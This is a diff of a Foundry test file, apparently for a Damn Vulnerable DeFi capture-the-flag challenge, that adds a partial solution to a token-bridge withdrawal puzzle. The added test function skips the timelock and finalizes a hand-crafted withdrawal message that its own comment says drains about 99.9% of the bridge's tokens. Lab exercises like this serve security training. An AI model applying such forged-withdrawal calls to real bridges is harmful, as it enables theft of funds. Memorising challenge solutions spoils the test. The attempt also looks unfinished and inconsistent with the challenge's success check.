@@ -22,7 +22,8 @@ contract WithdrawalChallenge is Test {
     uint256 constant START_TIMESTAMP = 1718786915;
     uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
     uint256 constant WITHDRAWALS_AMOUNT = 4;
-    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;
+    bytes32 constant WITHDRAWALS_ROOT =
+        0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;
 
     TokenBridge l1TokenBridge;
     DamnValuableToken token;
@@ -58,7 +59,11 @@ contract WithdrawalChallenge is Test {
 
         // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
         token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
-        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));
+        vm.store(
+            address(l1TokenBridge),
+            0,
+            bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT)
+        );
 
         // Set withdrawals root in L1 gateway
         l1Gateway.setRoot(WITHDRAWALS_ROOT);
@@ -81,15 +86,75 @@ contract WithdrawalChallenge is Test {
         assertEq(l1Gateway.DELAY(), 7 days);
         assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);
 
-        assertEq(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
+        assertEq(
+            token.balanceOf(address(l1TokenBridge)),
+            INITIAL_BRIDGE_TOKEN_AMOUNT
+        );
         assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
+
+    // struct Events {
+    //     bytes[] topics;
+    //     bytes data;
+    // }
+    // string memory json = vm.readFile("./test/withdrawal/withdrawals.json");
+    // bytes memory data = vm.parseJson(json);
+    // Events[] storage events = abi.decode(data, (Events[]));
+
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        skip(8 days);
+
+        // // 1 - Withdrawal
+        // l1Gateway.finalizeWithdrawal(
+        //     0,
+        //     0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+        //     0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+        //     1718786915,
+        //     hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+        //     new bytes32[](0)
+        // );
+        // // 2 - Withdrawal
+        // l1Gateway.finalizeWithdrawal(
+        //     1,
+        //     0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+        //     0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+        //     1718786965,
+        //     hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+        //     new bytes32[](0)
+        // );
+
+        // 3 - Withdrawal takes the most so far 9.99e23 -> 99.9% of the bridge's tokens (1e24)
+        // Nonce,  L2Sender, Target, Timestamp, Data
+        l1Gateway.finalizeWithdrawal({
+            nonce: 1,
+            l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // Wrong L2Sender
+            target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            timestamp: 1718787050,
+            message: hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c26000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+            proof: new bytes32[](0)
+        });
+        // l1Gateway.finalizeWithdrawal({
+        //     nonce: 1,
+        //     l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+        //     target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+        //     timestamp: 1718787050,
+        //     message: hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+        //     proof: new bytes32[](0)
+        // });
+
+        // // 4 - Withdrawal
+        // l1Gateway.finalizeWithdrawal(
+        //     1,
+        //     0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+        //     0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+        //     1718787127,
+        //     hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000",
+        //     new bytes32[](0)
+        // );
     }
 
     /**
@@ -97,28 +162,46 @@ contract WithdrawalChallenge is Test {
      */
     function _isSolved() private view {
         // Token bridge still holds most tokens
-        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
-        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);
+        assertLt(
+            token.balanceOf(address(l1TokenBridge)),
+            INITIAL_BRIDGE_TOKEN_AMOUNT
+        );
+        assertGt(
+            token.balanceOf(address(l1TokenBridge)),
+            (INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18) / 100e18
+        );
 
         // Player doesn't have tokens
         assertEq(token.balanceOf(player), 0);
 
         // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
-        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
+        assertGe(
+            l1Gateway.counter(),
+            WITHDRAWALS_AMOUNT,
+            "Not enough finalized withdrawals"
+        );
         assertTrue(
-            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
+            l1Gateway.finalizedWithdrawals(
+                hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"
+            ),
             "First withdrawal not finalized"
         );
         assertTrue(
-            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
+            l1Gateway.finalizedWithdrawals(
+                hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"
+            ),
             "Second withdrawal not finalized"
         );
         assertTrue(
-            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
+            l1Gateway.finalizedWithdrawals(
+                hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"
+            ),
             "Third withdrawal not finalized"
         );
         assertTrue(
-            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
+            l1Gateway.finalizedWithdrawals(
+                hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"
+            ),
             "Fourth withdrawal not finalized"
         );
     }
